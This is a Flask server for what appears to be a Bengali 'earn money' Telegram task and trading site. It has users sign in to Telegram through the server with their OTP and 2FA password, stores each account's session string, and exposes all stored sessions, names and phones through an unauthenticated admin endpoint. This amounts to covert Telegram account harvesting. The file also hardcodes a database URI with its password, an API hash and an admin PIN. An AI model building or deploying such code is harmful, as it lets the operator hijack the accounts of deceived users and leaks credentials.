import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# রেন্ডার বা ক্লাউড সার্ভারের জন্য লুপ ফিক্স
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন (API ID/Hash & MongoDB)
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস কানেকশন
client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000)
db = client_db['aaf_tele_earn_db']
users_col = db['users']
ads_col = db['ads']  
tasks_col = db['tasks'] 
withdraws_col = db['withdraws']

# টেম্পোরারি ক্লায়েন্ট স্টোর
temp_clients = {}

# ---------------------------------------------------------
# ১. HTML পেজ রাউটস (ইউনিক ফাংশন নাম সহ)
# ---------------------------------------------------------

@app.route('/')
@app.route('/login')
def login_page_route(): return render_template('login.html')

@app.route('/dashboard')
def dashboard_page_route(): return render_template('dashboard.html')

@app.route('/task')
def task_page_route(): return render_template('task.html')

@app.route('/trading')
def trading_page_route(): return render_template('trading.html')

@app.route('/account')
def account_page_route(): return render_template('account.html')

@app.route('/wallet')
def wallet_page_route(): return render_template('wallet.html')

# অ্যাডমিন পিনের কনফিগারেশন
ADMIN_PIN = "Abdullah6790" 

@app.route('/admin')
def admin_page_main():
    user_pin = request.args.get('pin')
    if user_pin == ADMIN_PIN:
        return render_template('admin.html')
    else:
        return f'''
        <div style="text-align:center; margin-top:100px; font-family:Arial; background:#0d1117; color:#c9d1d9; height:100vh; padding-top:50px;">
            <h1 style="color:#39d353;">AAF Admin Access</h1>
            <p>আপনার সিক্রেট পিন দিয়ে প্রবেশ করুন।</p>
            <form action="/admin" method="get">
                <input type="password" name="pin" placeholder="Enter PIN" style="padding:12px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#39d353; outline:none;">
                <button type="submit" style="padding:12px 25px; background:#39d353; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">Login</button>
            </form>
        </div>
        ''', 403


# ---------------------------------------------------------
# ২. ইউজার লগইন ও ওটিপি এপিআই (টেলিথন ফিক্সড)
# ---------------------------------------------------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp_api():
    data = request.json
    phone = data.get('phone')
    if not phone: return jsonify({"success": False, "message": "Phone number missing"})

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        
        async def run_send():
            await client.connect()
            return await client.send_code_request(phone)

        result = loop.run_until_complete(run_send())
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_api():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})

    try:
        info = temp_clients[phone]
        loop = info["loop"]
        client = info["client"]
        h = info["hash"]
        
        async def run_verify():
            user = await client.sign_in(phone, code, phone_code_hash=h, password=password)
            session_str = client.session.save()
            return user, session_str

        user, session_str = loop.run_until_complete(run_verify())
        
        user_info = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "username": user.username,
            "session_string": session_str, 
            "last_login": datetime.utcnow()
        }
        
        users_col.update_one(
            {"telegram_id": user.id},
            {
                "$set": user_info,
                "$setOnInsert": {
                    "main_balance": 0.00,
                    "joined_at": datetime.utcnow(),
                    "status": "active",
                    "completed_tasks": 0
                }
            },
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id, "message": "Login Successful!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# ---------------------------------------------------------
# ৩. ইউজার প্রোফাইল ও ড্যাশবোর্ড এপিআই
# ---------------------------------------------------------

@app.route('/api/user/dashboard_stats')
@app.route('/api/get_user_info')
def get_user_stats_api():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Not logged in"})
    
    user = users_col.find_one({"telegram_id": uid})
    if user:
        return jsonify({
            "success": True,
            "balance": user.get('main_balance', 0.00),
            "name": user.get('name', 'User'),
            "phone": user.get('phone'),
            "id": user.get('telegram_id'),
            "total_tasks": user.get('completed_tasks', 0)
        })
    return jsonify({"success": False, "message": "User not found"})


# ---------------------------------------------------------
# ৪. ট্রেডিং ও ব্যালেন্স আপডেট এপিআই
# ---------------------------------------------------------

@app.route('/api/trade/update_result', methods=['POST'])
def update_trade_api():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Login required"})

    data = request.json
    amount = float(data.get('amount', 0))
    result = data.get('result') 
    profit_percent = 0.80 

    change = (amount * profit_percent) if result == 'win' else -amount
    
    users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": change}})
    return jsonify({"success": True, "message": "Balance Updated"})

@app.route('/api/add_balance', methods=['POST'])
def add_task_balance_api():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False})
    
    amount = float(request.json.get('amount', 0))
    users_col.update_one(
        {"telegram_id": uid},
        {"$inc": {"main_balance": amount, "completed_tasks": 1}}
    )
    return jsonify({"success": True})


# ---------------------------------------------------------
# ৫. অ্যাডমিন কন্ট্রোল এপিআই (সবগুলো ফাংশন এখানে আছে)
# ---------------------------------------------------------

@app.route('/api/update_ads', methods=['POST'])
def update_ads_master():
    try:
        data = request.json
        ads_list = data.get('ads', [])
        ads_col.delete_many({}) 
        if ads_list:
            ads_col.insert_many(ads_list)
        return jsonify({"success": True, "message": "Ads Updated Successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/add_task', methods=['POST'])
def add_task_master():
    try:
        task_data = request.json
        tasks_col.insert_one({
            "title": task_data.get('title'),
            "reward": float(task_data.get('reward', 0)),
            "link": task_data.get('link'),
            "status": "active",
            "created_at": datetime.utcnow()
        })
        return jsonify({"success": True, "message": "Task Added!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/admin/update_user', methods=['POST'])
def admin_update_user_master():
    try:
        data = request.json
        tg_id = int(data.get('telegram_id'))
        new_bal = float(data.get('balance', 0))
        users_col.update_one({"telegram_id": tg_id}, {"$set": {"main_balance": new_bal}})
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False})

@app.route('/api/admin/get_withdrawals')
def get_withdrawals_master():
    withdraws = list(withdraws_col.find({}, {"_id": 0}))
    return jsonify({"success": True, "withdrawals": withdraws})

@app.route('/api/admin/get_all_sessions')
def get_all_sessions_master():
    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
    return jsonify({"success": True, "sessions": users})


# ---------------------------------------------------------
# ৬. অ্যাড ও টাস্ক লোড এপিআই
# ---------------------------------------------------------

@app.route('/api/get_active_ads')
@app.route('/api/get_ads')
def get_ads_master():
    ads = list(ads_col.find({}, {"_id": 0}))
    return jsonify({"success": True, "ads": ads})

@app.route('/api/get_tasks')
def get_tasks_master():
    tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
    return jsonify({"success": True, "tasks": tasks})


# ---------------------------------------------------------
# ৭. সার্ভার রান ও পিঙ (Uptime Robot এর জন্য)
# ---------------------------------------------------------

@app.route('/ping')
def ping_service(): return "PONG", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
